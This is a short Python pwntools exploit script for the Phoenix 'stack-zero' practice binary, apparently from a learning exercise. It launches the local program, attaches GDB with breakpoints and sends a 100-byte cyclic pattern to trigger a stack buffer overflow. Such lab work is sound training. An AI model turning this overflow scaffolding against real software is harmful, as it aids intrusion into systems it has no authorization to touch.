#!/usr/bin/env python3

from pwn import *

# Need to set the pwntools "context" context for controlling
# many settings in pwntools library's capabilities
#
# The context is for little-endian AMD64 architecture running on Linux OS
context.update(arch='amd64', os='linux')
#
# Using this to log and see all data transmitted for debugging purposes
context.log_level = "debug"
#
# Configuring settings for GDB/Pwndbg to be displayed in a split window with tmux
# Note that a tmux window has to be opened *before* exploit.py is executed 
# for successful debugging
context.terminal = ['tmux', 'splitw', '-h']
#
#################################################################################
#
# Preparing the exploit's payload
payload = cyclic(100)
#
#################################################################################
#
# Launching exploit!
print("Launching The Stack Zero Exploit!")

p = process(["stack-zero"], env={}, cwd="/opt/phoenix/amd64")

# Attaching GDB debugger. If any debugging is needed, 
# open tmux before launching exploit
gdb.attach(p, '''
b main
b *0x000000000040060c
''')

# Sending the command-line inputted payload
p.sendline(payload)

# Making the process interactive so users can
# interact with the process via its terminal!
p.interactive() 
